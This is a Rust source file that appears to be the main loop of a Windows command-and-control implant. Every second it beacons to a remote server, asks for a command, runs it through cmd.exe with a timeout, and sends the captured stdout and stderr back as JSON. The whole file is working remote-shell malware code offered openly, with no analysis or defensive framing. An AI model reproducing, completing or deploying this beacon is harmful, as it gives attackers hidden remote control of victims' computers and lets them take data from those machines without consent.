use crate::winsock;
use anyhow::{Result, anyhow};
use serde_json as json;
use std::{
    io::Read,
    process::{Command, Stdio},
    thread::sleep,
    time::Duration,
};

type Stdout = Vec<u8>;
type Stderr = Vec<u8>;

const BEACON_DELAY: Duration = Duration::from_secs(1); // how often to callback
const POLL_DELAY: Duration = Duration::from_millis(100); // how often to poll commands

// runs a command with a timeout
fn command_with_timeout(argv: &[&str], timeout: Duration) -> Result<(Stdout, Stderr)> {
    // create buffers for output
    let mut stdout = Stdout::new();
    let mut stderr = Stderr::new();

    // spawn the command
    let mut cmd = Command::new(argv[0]);
    let mut p = cmd
        .args(&argv[1..])
        .stderr(Stdio::piped())
        .stdout(Stdio::piped())
        .stdin(Stdio::null())
        .spawn()?;

    // start the timer
    let mut elapsed = Duration::new(0, 0);
    loop {
        match p.try_wait() {
            Ok(op) => match op {
                Some(_) => {
                    // process is done :)
                    match p.stdout {
                        Some(mut out) => {
                            out.read_to_end(&mut stdout)?;
                        }
                        None => {}
                    }

                    match p.stderr {
                        Some(mut err) => {
                            err.read_to_end(&mut stderr)?;
                        }
                        None => {}
                    }

                    return Ok((stdout, stderr));
                }
                None => {
                    // process is still running :(
                    sleep(POLL_DELAY);
                    elapsed += POLL_DELAY;
                    if elapsed >= timeout {
                        p.kill()?;
                        return Err(anyhow!("Command timed out"));
                    }
                }
            },
            Err(_) => {} // syscall error (idgaf)
        }
    }
}

pub fn main_loop() -> Result<()> {
    loop {
        // eep
        sleep(BEACON_DELAY);

        // send callback asking for command
        let reply = match winsock::send_and_recieve(b"gib command".to_vec(), crate::DEST) {
            Ok(reply) => reply,
            Err(e) => {
                return Err(anyhow!("send_and_recieve failed: {}", e));
            }
        };

        // parse the command from the reply
        let cmd = String::from_utf8_lossy(&reply).to_string();

        // kill switch
        if ["exit", "quit"].contains(&cmd.as_str()) {
            println!("recieved {}. exiting...", cmd);
            return Ok(());
        }

        // run command (with cmd)
        let (out, err) = command_with_timeout(&["cmd.exe", "/C", &cmd], Duration::from_secs(5))?;

        if out.is_empty() && err.is_empty() {
            println!("command {} returned no output", cmd);
            continue;
        }

        // construct json response
        let output = json::Map::from_iter([
            (
                "stdout".to_string(),
                json::Value::String(String::from_utf8_lossy(out.as_slice()).to_string()),
            ),
            (
                "stderr".to_string(),
                json::Value::String(String::from_utf8_lossy(err.as_slice()).to_string()),
            ),
        ]);

        println!("output json: {}", json::to_string(&output)?);

        // send output back to server
        let reply = match winsock::send_and_recieve(json::to_vec(&output)?, crate::DEST) {
            Ok(reply) => reply,
            Err(e) => return Err(anyhow!("send_and_recieve failed: {}", e)),
        };

        println!("reply to output: {}", String::from_utf8_lossy(&reply));
    }
}
